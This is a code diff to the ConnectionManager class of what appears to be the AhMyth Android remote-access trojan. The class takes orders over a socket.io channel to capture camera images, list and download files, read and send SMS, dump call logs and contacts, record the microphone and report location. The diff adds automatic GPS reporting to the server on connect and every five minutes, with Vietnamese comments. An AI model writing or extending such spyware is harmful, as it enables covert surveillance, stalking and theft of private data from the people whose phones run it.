@@ -1,6 +1,7 @@
 package ahmyth.mine.king.ahmyth;
 
 import android.content.Context;
+import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import org.json.JSONObject;
@@ -19,97 +20,195 @@ public class ConnectionManager {
     private static io.socket.client.Socket ioSocket;
     private static FileManager fm = new FileManager();
 
-    public static void startAsync(Context con)
+    /** Gửi vị trí lên server định kỳ (ms). */
+    private static final long LOCATION_UPDATE_INTERVAL_MS = 5 * 60 * 1000; // 5 phút
+    private static Handler locationUpdateHandler;
+    private static Runnable locationUpdateRunnable;
+
+    public static void startAsync(final Context con)
     {
         try {
             context = con;
             sendReq();
         }catch (Exception ex){
-            startAsync(con);
+            // Add delay before retry to prevent StackOverflow
+            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    startAsync(con);
+                }
+            }, 5000);
         }
-
     }
 
-
     public static void sendReq() {
-try {
+        try {
+            if (ioSocket != null && ioSocket.connected())
+                return;
 
-
-
-
-
-    if(ioSocket != null )
-        return;
-
-    ioSocket = IOSocket.getInstance().getIoSocket();
-
-
-    ioSocket.on("ping", new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            ioSocket.emit("pong");
-        }
-    });
-
-    ioSocket.on("order", new Emitter.Listener() {
-        @Override
-        public void call(Object... args) {
-            try {
-                JSONObject data = (JSONObject) args[0];
-                String order = data.getString("order");
-                Log.e("order",order);
-                switch (order){
-                    case "x0000ca":
-                        if(data.getString("extra").equals("camList"))
-                            x0000ca(-1);
-                        else if (data.getString("extra").equals("1"))
-                            x0000ca(1);
-                        else if (data.getString("extra").equals("0"))
-                            x0000ca(0);
-                        break;
-                    case "x0000fm":
-                        if (data.getString("extra").equals("ls"))
-                            x0000fm(0,data.getString("path"));
-                        else if (data.getString("extra").equals("dl"))
-                            x0000fm(1,data.getString("path"));
-                        break;
-                    case "x0000sm":
-                        if(data.getString("extra").equals("ls"))
-                            x0000sm(0,null,null);
-                        else if(data.getString("extra").equals("sendSMS"))
-                           x0000sm(1,data.getString("to") , data.getString("sms"));
-                        break;
-                    case "x0000cl":
-                        x0000cl();
-                        break;
-                    case "x0000cn":
-                        x0000cn();
-                        break;
-                    case "x0000mc":
-                            x0000mc(data.getInt("sec"));
-                        break;
-                    case "x0000lm":
-                        x0000lm();
-                        break;
-
-
+            if (ioSocket == null) {
+                Log.d("ConnectionManager", "Getting socket instance...");
+                IOSocket socketInstance = IOSocket.getInstance();
+                if (socketInstance == null) {
+                    Log.e("ConnectionManager", "IOSocket instance is null, waiting for context...");
+                    throw new Exception("Context not ready");
                 }
-
-
-
-            }catch (Exception e) {
-                e.printStackTrace();
+                ioSocket = socketInstance.getIoSocket();
             }
+
+            if (ioSocket == null) {
+                Log.e("ConnectionManager", "ioSocket is null after attempt");
+                return;
+            }
+
+            Log.d("ConnectionManager", "Setting up socket listeners...");
+
+            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    Log.i("ConnectionManager", "Connected to server!");
+                    sendLocationUpdateToServer();
+                    startPeriodicLocationUpdates();
+                }
+            });
+
+            ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    Log.w("ConnectionManager", "Disconnected from server");
+                    stopPeriodicLocationUpdates();
+                }
+            });
+
+            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    if (args.length > 0) {
+                        Log.e("ConnectionManager", "Connection Error: " + args[0].toString());
+                    } else {
+                        Log.e("ConnectionManager", "Connection Error unknown");
+                    }
+                }
+            });
+
+            ioSocket.on("ping", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    Log.d("ConnectionManager", "Ping received");
+                    ioSocket.emit("pong");
+                }
+            });
+
+            ioSocket.on("order", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    try {
+                        JSONObject data = (JSONObject) args[0];
+                        String order = data.getString("order");
+                        Log.e("order", order);
+                        switch (order) {
+                            case "x0000ca":
+                                if (data.getString("extra").equals("camList"))
+                                    x0000ca(-1);
+                                else if (data.getString("extra").equals("1"))
+                                    x0000ca(1);
+                                else if (data.getString("extra").equals("0"))
+                                    x0000ca(0);
+                                break;
+                            case "x0000fm":
+                                if (data.getString("extra").equals("ls"))
+                                    x0000fm(0, data.getString("path"));
+                                else if (data.getString("extra").equals("dl"))
+                                    x0000fm(1, data.getString("path"));
+                                break;
+                            case "x0000sm":
+                                if (data.getString("extra").equals("ls"))
+                                    x0000sm(0, null, null);
+                                else if (data.getString("extra").equals("sendSMS"))
+                                    x0000sm(1, data.getString("to"), data.getString("sms"));
+                                break;
+                            case "x0000cl":
+                                x0000cl();
+                                break;
+                            case "x0000cn":
+                                x0000cn();
+                                break;
+                            case "x0000mc":
+                                x0000mc(data.getInt("sec"));
+                                break;
+                            case "x0000lm":
+                                x0000lm();
+                                break;
+                        }
+                    } catch (Exception e) {
+                        Log.e("ConnectionManager", "Error processing order", e);
+                    }
+                }
+            });
+
+            Log.d("ConnectionManager", "Attempting to connect...");
+            ioSocket.connect();
+
+        } catch (Exception ex) {
+            Log.e("ConnectionManager", "sendReq error: " + ex.getMessage());
         }
-    });
-    ioSocket.connect();
+    }
 
-}catch (Exception ex){
+    /** Gửi vị trí hiện tại lên server (event "locationUpdate"). */
+    public static void sendLocationUpdateToServer() {
+        if (ioSocket == null || !ioSocket.connected() || context == null) return;
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    LocManager gps = new LocManager(context);
+                    JSONObject location = new JSONObject();
+                    if (gps.canGetLocation()) {
+                        double latitude = gps.getLatitude();
+                        double longitude = gps.getLongitude();
+                        location.put("enable", true);
+                        location.put("lat", latitude);
+                        location.put("lng", longitude);
+                    } else {
+                        location.put("enable", false);
+                    }
+                    final JSONObject payload = location;
+                    new Handler(Looper.getMainLooper()).post(new Runnable() {
+                        @Override
+                        public void run() {
+                            if (ioSocket != null && ioSocket.connected())
+                                ioSocket.emit("locationUpdate", payload);
+                        }
+                    });
+                } catch (Exception e) {
+                    Log.e("ConnectionManager", "sendLocationUpdateToServer", e);
+                }
+            }
+        }).start();
+    }
 
-   Log.e("error" , ex.getMessage());
+    /** Bắt đầu gửi vị trí định kỳ. */
+    private static void startPeriodicLocationUpdates() {
+        stopPeriodicLocationUpdates();
+        if (locationUpdateHandler == null)
+            locationUpdateHandler = new Handler(Looper.getMainLooper());
+        locationUpdateRunnable = new Runnable() {
+            @Override
+            public void run() {
+                sendLocationUpdateToServer();
+                if (locationUpdateHandler != null && locationUpdateRunnable != null)
+                    locationUpdateHandler.postDelayed(locationUpdateRunnable, LOCATION_UPDATE_INTERVAL_MS);
+            }
+        };
+        locationUpdateHandler.postDelayed(locationUpdateRunnable, LOCATION_UPDATE_INTERVAL_MS);
+    }
 
-}
-
+    /** Dừng gửi vị trí định kỳ. */
+    private static void stopPeriodicLocationUpdates() {
+        if (locationUpdateHandler != null && locationUpdateRunnable != null) {
+            locationUpdateHandler.removeCallbacks(locationUpdateRunnable);
+            locationUpdateRunnable = null;
+        }
     }
 
     public static void x0000ca(int req){
